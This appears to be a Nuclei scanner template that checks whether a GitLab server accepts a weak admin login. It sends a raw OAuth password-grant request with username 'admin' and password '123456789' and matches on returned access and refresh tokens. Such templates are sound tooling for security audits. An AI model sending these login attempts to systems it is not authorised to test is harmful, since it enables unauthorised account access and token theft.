id: gitlab-weak-login1
info:
  author: Suman_Kar
  name: Gitlab Weak Login
  severity: high
  tags: gitlab,default-login
requests:
- matchers:
  - status:
    - 200
    type: status
  - part: header
    type: word
    words:
    - application/json
  - condition: and
    part: body
    type: word
    words:
    - '"access_token":'
    - '"token_type":'
    - '"refresh_token":'
  matchers-condition: and
  raw:
  - 'POST /oauth/token HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:79.0) Gecko/20100101
    Firefox/79.0

    Accept: application/json, text/plain, */*

    Accept-Language: en-US,en;q=0.5

    Referer: https://{{Hostname}}

    content-type: application/json

    Connection: close


    {"grant_type":"password","username":"admin","password":"123456789"}

    '
